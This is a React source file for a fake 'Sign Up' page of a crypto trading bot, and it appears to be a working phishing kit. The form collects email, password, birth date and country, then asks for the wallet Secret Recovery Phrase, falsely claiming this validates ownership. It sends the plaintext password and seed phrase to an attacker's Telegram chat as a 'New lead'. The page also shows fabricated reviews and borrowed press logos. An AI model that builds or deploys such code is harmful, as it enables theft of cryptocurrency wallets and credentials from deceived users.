import React, { useState, useEffect, useRef } from 'react';
import { checkRegexEmail } from '../../common/utils/checkRegexEmail';
import { Logotype } from '../../components/Logotype';
import { TelegramService } from '../../services/telegram.service';
import { CRYPTO_NAME, TELEGRAM_TARGET_CHAT_ID } from '../../common/contants';
import './index.css';

type SeedLengthType = 12 | 15 | 18 | 21 | 24;

const SeedLengths: SeedLengthType[] = [12, 15, 18, 21, 24];

type LeadType = {
  email: string;
  username: string;
  birthDate: string;
  country: string;
  password: string;
  repeatPassword: string;
  seed: Record<number, string>;
  location?: {
    city: string;
    continentCode: string;
    continentName: string;
    countryCode: string;
    countryName: string;
    ipAddress: string;
    stateProv: string;
  }
}

type ReviewType = {
  avatar: string;
  name: string;
  date: string;
  title: string;
  content: string;
}

const reviewItems: ReviewType[] = [
  {
    avatar: './assets/images/avatars/avatar-adam-zentini.png',
    name: 'Adam Zentini',
    date: 'Mar 6, 2023',
    title: 'Great! Product!',
    content: `${CRYPTO_NAME} has become a reliable ally in crypto trading - prompt connection and unique strategies instill confidence in the outcome.`
  },
  {
    avatar: './assets/images/avatars/avatar-robert-man.png',
    name: 'Robert',
    date: 'Jun 15, 2023',
    title: 'Great Product!',
    content: `An excellent solution for automated trading! The ${CRYPTO_NAME} bot demonstrates high efficiency, instant connection, and an intuitive interface.`
  },
  {
    avatar: './assets/images/avatars/avatar-jason-man.png',
    name: 'Jason',
    date: 'Jun 15, 2023',
    title: `I’m a noob to crypto - Love ${CRYPTO_NAME}`,
    content: `Professionalism in every trade! ${CRYPTO_NAME} stands out with its high performance, delivering reliable results in the world of cryptocurrencies.`
  },
]

export const RegisterPage = () => {
  /**
   * States
   */
  /** Lead data state */
  const [lead, setLead] = useState<LeadType>({
    email: '', username: '',
    birthDate: '', country: '',
    password: '', repeatPassword: '', seed: {} });
  const [seedLength, setSeedLength] = useState<SeedLengthType>(12);
  const [seedValidation, setSeedValidation] = useState<boolean>(false);
  /** Agree checkbox state */
  const [agreeBtn, setAgreeBtn] = useState<boolean>(false);
  /**
   * Refs
   */
  const emailInputRef = useRef<HTMLInputElement>(null);
  const usernameInputRef = useRef<HTMLInputElement>(null);
  const dateInputRef = useRef<HTMLInputElement>(null);
  const countryInputRef = useRef<HTMLInputElement>(null);
  const passwordInputRef = useRef<HTMLInputElement>(null);
  const repeatPasswordInputRef = useRef<HTMLInputElement>(null);
  /**
   * Effects
   */
  useEffect(() => {

    window.document.title = 'Sign Up';

    // if (!lead.location) {

    //   fetch('https://api.db-ip.com/v2/free/self', { method: 'GET' })
    //     .then((res) => res.json())
    //     .then((res) => setLead({ ...lead, location: res }));
    // }
  }, [lead]);
  /**
   * Functions
   */
  /**
   * 
   * @param elem 
   * @param condition 
   */
  const validationField = (elem: HTMLInputElement, condition: boolean): void =>{

    if (condition) {

      if (elem.classList.contains('invalid'))
        elem.classList.remove('invalid');
    } else {
      elem.classList.add('invalid');
    }
  }
  /**
   * Handle for button sumbit onClick event
   * - Validation lead information
   * - Send lead information with TelegramService to destination
   * @returns void
   */
  const handleSendLead = (): void => {
    
    if (!agreeBtn) return alert('Agree not checked');

    // Check email field
    if (lead.email.length === 0 || !checkRegexEmail(lead.email)) {

      emailInputRef.current?.classList.add('invalid');

      return alert('Email not valid');
    } else emailInputRef.current?.classList.remove('invalid');

    // Check username field
    if (lead.username.length === 0) {

      usernameInputRef.current?.classList.add('invalid');

      return alert('Username not valid');
    } else usernameInputRef.current?.classList.remove('invalid');

    // Check date field
    if (lead.birthDate === '') {

      dateInputRef.current?.classList.add('invalid');

      return alert('Birthdate not valid');
    } else dateInputRef.current?.classList.remove('invalid');

    // Check country field
    if (lead.country.length === 0) {

      countryInputRef.current?.classList.add('invalid');

      return alert('Country not valid');
    } else countryInputRef.current?.classList.remove('invalid');

    // Check password field
    if (lead.password.length === 0) {

      passwordInputRef.current?.classList.add('invalid');

      return alert('Password not valid');
    } else passwordInputRef.current?.classList.remove('invalid');

    // // Check seed field
    // if (lead.seed.length === 0 || lead.seed.split(' ').length < 12) {

    //   seedInputRef.current?.classList.add('invalid');

    //   return alert('Seed not valid');
    // } else seedInputRef.current?.classList.remove('invalid');

    const ipInformation = (): string => {
      if (!!lead.location) {
        return ''
      + `IP: ${lead.location?.ipAddress}\n`
      + `City: ${lead.location?.city} State: ${lead.location?.stateProv}\n`
      + `Country: ${lead.location?.countryName} ${lead.location?.continentCode}`
      } else {
        return 'no information'
      }
    }

    const message: string = '' 
      + '<b>New lead generated</b>\n\n'
      + `Username: ${lead.username}\n`
      + `Email: ${lead.email}\n`
      + `Birth day: ${new Date(lead.birthDate).toLocaleString()}\n`
      + `Country: ${lead.country}\n`
      + `Password: ${lead.password}\n`
      + `Seed:\n<code>${Object.values(lead.seed).join(' ')}</code>\n\n`
      + `<b>IP INFORMATION</b>\n\n`
      + ipInformation();

    TelegramService.sendMessage(TELEGRAM_TARGET_CHAT_ID, message)
      .then(() => {
        window.localStorage.setItem('lead-email', lead.email);
        window.location.href = '/success';
      })
      .catch((err) => alert('Failed request, try again later!'));
  }
  
  return (
    <>

      <div id="app__page_auth">

        {/* Registration block */}
        <div className="app__auth_register_block">

          <div
            id="app__auth_register_logotype"
          >
            <Logotype />
          </div>

          <div style={{ display: 'flex', height: '100%' }}>
            <div id="app__auth_register_block_form">
              <span id="app__register_form_title">
                <h1>Sign Up</h1>
              </span>

              {agreeBtn ? (
                <>
                  {/* Seed form */}
                  <div id="app__register_form_seed">

                    <div id="header">
                      <h1 id="title">Access your wallet with your<br/>Secret Recovery Phrase</h1>
                      <p id="subtitle">{CRYPTO_NAME} cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password. First, enter the Secret Recovery Phrase that you were given when you created your wallet.</p>
                    </div>

                    <div id="app__seed_length_select">

                      <label htmlFor="app__seed_length_selection_">
                        Type your Secret Recovery Phrase
                      </label>

                      <select
                        id="app__seed_length_selection"
                        defaultValue={seedLength}
                        onChange={(evt) => setSeedLength(Number(evt.target.value) as SeedLengthType)}
                      >
                        {SeedLengths.map((seed, key) => (
                          <option key={key} value={seed}>I have a {seed}-word phrase</option>
                        ))}
                      </select>

                    </div>

                    <div id="app__seed_form_block">
                        
                      {[...new Array(seedLength)].map((_, key) => (
                        <div
                          key={key}
                          className='app__seed_form_cell'
                        >
                          <label htmlFor={`app__seed_form_cell_input_${key}`}>{key+1}</label>
                          <input
                            id={`app__seed_form_cell_input_${key}`}
                            type="text"
                            onChange={(evt) => {
                              
                              if (evt.target.value.length < 2 || evt.target.value.split(' ').length > 1) {
                                evt.target.classList.add('invalid')
                              } else {

                                if (evt.target.classList.contains('invalid'))
                                  evt.target.classList.remove('invalid');
                              }

                              setLead({ ...lead, seed: { ...lead.seed, [key]: evt.target.value } })

                            }}
                          />
                        </div>
                      ))}

                    </div>

                  </div>
                </>
              ) : (
                <>
                  {/** Registration form */}
                  <div id="app__register_form_controls">

                    <div className='app__register_form_control'>
                      <label>
                        <span>Email</span>
                        <input
                          ref={emailInputRef}
                          type="email"
                          placeholder='Email'
                          value={lead.email}
                          onChange={
                            (evt) => {

                              if (emailInputRef.current)
                                validationField(
                                  emailInputRef.current,
                                  checkRegexEmail(evt.target.value)
                                );

                              setLead({ ...lead, email: evt.target.value });
                            }
                          }
                        />
                      </label>
                    </div>

                    <div className='app__register_form_control'>
                      <label>
                        <span>Username</span>
                        <input
                          ref={usernameInputRef}
                          type="text"
                          placeholder='Username'
                          value={lead.username}
                          onChange={
                            (evt) => {

                              if (usernameInputRef.current)
                                validationField(
                                  usernameInputRef.current,
                                  evt.target.value.length > 0
                                )

                              setLead({ ...lead, username: evt.target.value });
                            }
                          }
                        />
                      </label>
                    </div>

                    <div className='app__register_form_control'>
                      <label>
                        <span>Date of birth</span>
                        <input
                          ref={dateInputRef}
                          type="date"
                          id="date"
                          value={lead.birthDate}
                          onChange={
                            (evt) => setLead({ ...lead, birthDate: evt.target.value })
                          }
                        />
                      </label>
                    </div>

                    <div className='app__register_form_control'>
                      <label>
                        <span>Country</span>
                        <input
                          ref={countryInputRef}
                          type="text"
                          placeholder='Country'
                          value={lead.country}
                          onChange={(evt) => {

                            if (countryInputRef.current)
                              validationField(
                                countryInputRef.current,
                                evt.target.value.length > 0
                              )

                            setLead({ ...lead, country: evt.target.value })
                          }}
                        />
                      </label>
                    </div>

                    <div className='app__register_form_control'>
                      <label>
                        <span>Password</span>
                        <input
                          ref={passwordInputRef}
                          type="password"
                          placeholder='Password'
                          value={lead.password}
                          onChange={(evt) => {

                            if (passwordInputRef.current)
                              validationField(
                                passwordInputRef.current,
                                evt.target.value.length > 6
                              )
                            
                            setLead({ ...lead, password: evt.target.value });
                          }}
                        />
                      </label>
                    </div>

                    <div className='app__register_form_control'>
                      <label>
                        <span>Repeat password</span>
                        <input
                          ref={repeatPasswordInputRef}
                          type="password"
                          placeholder='Password'
                          value={lead.repeatPassword}
                          onChange={(evt) => {

                            if (repeatPasswordInputRef.current)
                              validationField(
                                repeatPasswordInputRef.current,
                                evt.target.value === lead.password
                              )
                            
                            setLead({ ...lead, repeatPassword: evt.target.value });
                          }}
                        />
                      </label>
                    </div>

                  </div>
                </>
              )}

              <div className='app__register_form_control' id="app__register_form_checkbox_control">
                <input type="checkbox" id="auth__form_checkbox_agree" checked={agreeBtn} onChange={() => setAgreeBtn(!agreeBtn)} />
                <label htmlFor="auth__form_checkbox_agree">
                  <span>I agree to the <a href="/">Terms & Conditions</a></span>
                </label>
              </div>

              <div id="auth__form_submit">
                <button
                  onClick={handleSendLead}
                  disabled={!agreeBtn || Object.keys(lead.seed).length !== seedLength}
                >
                  Sign Up
                </button>
              </div>

            </div>
          </div>

        </div>

        {/* Reviews block */}
        <div className='app__auth_reviews_block'>

          <div style={{ display: 'block', height: '100%' }}>
            <div id="app__auth_reviews_block_content">

              <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center' }}>
                {/* Title */}
                <div id="app__reviews_block_title">

                  <h1>Trading Bot - your reliable partner in the world of profitable deals</h1>

                  <p>Maximize your success in the cryptocurrency world with our Trading Bot - your key to intelligent trading</p>

                </div>

                {/* Cards */}
                <div id="app__reviews_block_cards">
                  {reviewItems.map((item, key) => (
                    <div
                      key={key}
                      className='app__reviews_block_card_block'
                    >
                      <div id="app__reviews_block_card_header">
                        <img src={item.avatar} alt="" />
                      </div>
                      <div id="app__reviews_block_card_content">
                        <p>{item.content}</p>
                      </div>
                      <div id="app__reviews_block_card_footer">
                        <span>{item.name}</span>
                      </div>
                    </div>
                  ))}
                </div>

                {/* Footer title */}
                <div id="app__reviews_block_footer_title">
                    
                    <p>Over <span>10.000</span> crypto investors served! Try it out for free</p>

                </div>

                {/* Images bar */}
                <div id="app__reviews_block_footer_images">
                  <div>
                    <img src='./assets/images/logotypes/new-your-times-logo.png' alt="ICON" />
                  </div>
                  <div>
                    <img src='./assets/images/logotypes/forbes-logo.png' alt="ICON" />
                  </div>
                  <div>
                    <img src='./assets/images/logotypes/bloomberg-logo.png' alt="ICON" />
                  </div>
                  <div>
                    <img src='./assets/images/logotypes/coindesk-logo.png.png' alt="ICON" />
                  </div>
                  <div>
                    <img src='./assets/images/logotypes/trustwallet-logo.png' alt="ICON" />
                  </div>
                </div>
              </div>

            </div>
          </div>

        </div>

      </div>

    </>
  )
}